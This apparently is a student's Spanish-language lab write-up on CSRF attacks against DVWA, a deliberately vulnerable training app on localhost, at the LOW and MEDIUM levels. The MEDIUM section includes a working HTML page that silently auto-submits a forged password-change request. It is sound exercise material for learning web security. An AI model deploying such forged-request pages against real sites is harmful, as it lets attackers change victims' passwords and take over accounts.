# 🛡️ CSRF

## LOW
## 📋 Explicación
Lo único que tenemos que hacer en este es añadri la nueva password y cambiarla.

## 📸 Captura de pantalla
![a2dismod](https://github.com/PPS10711021/RA3/blob/main/RA3/RA3_2/images/csrf1.png)
![a2dismod](https://github.com/PPS10711021/RA3/blob/main/RA3/RA3_2/images/csrf2.png)
---

## MEDIUM
## 📋 Explicación
En este caso, tenemos que crear un archivo llamado csrf.php con el código de abajo y subir el archivo a DVWA.

## 🖥️ Explicación
```bash
<html>
  <body>
    <form action="http://127.0.0.1/DVWA/vulnerabilities/csrf/" method="POST">
      <input type="hidden" name="password_new" value="pass" />
      <input type="hidden" name="password_conf" value="pass" />
      <input type="hidden" name="Change" value="Change" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

## 📸 Captura de pantalla
![a2dismod](https://github.com/PPS10711021/RA3/blob/main/RA3/RA3_2/images/csrf4.png)
